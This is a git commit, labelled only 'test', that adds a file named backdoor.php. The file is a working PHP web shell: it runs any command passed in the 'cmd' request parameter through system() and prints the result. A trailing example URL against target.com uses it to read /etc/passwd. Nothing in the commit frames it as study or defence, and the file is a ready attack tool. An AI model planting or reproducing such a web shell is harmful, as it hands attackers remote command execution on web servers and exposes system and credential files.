c42e2a838aa58de4f9dfa1552f108f362623f74c
niyosh <niyosh@github.com>
2020-04-25 16:20:09 +0530

    test

---
+++ backdoor.php
@@ -0,0 +1,10 @@
+<?php
+if(isset($_REQUEST['cmd'])){
+        echo "<pre>";
+        $cmd = ($_REQUEST['cmd']);
+        system($cmd);
+        echo "</pre>";
+        die;
+}
+?>
+http://target.com/backdoor.php?cmd=cat+/etc/passwd
